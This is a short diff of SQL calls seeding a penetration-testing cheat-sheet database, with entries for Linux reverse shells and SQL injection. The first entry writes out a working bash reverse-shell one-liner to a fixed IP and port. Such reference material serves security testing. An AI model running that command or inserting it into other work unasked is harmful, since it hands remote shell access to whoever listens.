@@ -1,0 +1,3 @@
+CALL INSERTNEWCHEATSHEET('Basic and advanced Reverse Shells - Linux', 'sh -i >& /dev/tcp/10.10.10.120/443 0>&1', 'https://www.revshells.com/', 'Linux', 'Bash, sh', 'bash, sh', 'Pentest, testing', 'reverse shell, bash, sh, pentest, linux, basic, advanced');
+
+CALL INSERTNEWCHEATSHEET('Web Application Penetration Testing', 'SQL injection', 'https://www.example.com/cheatsheet1', 'Web Security', 'SQL, Penetration Testing', 'sql', 'Security, Testing', 'web application, penetration testing, SQL injection');
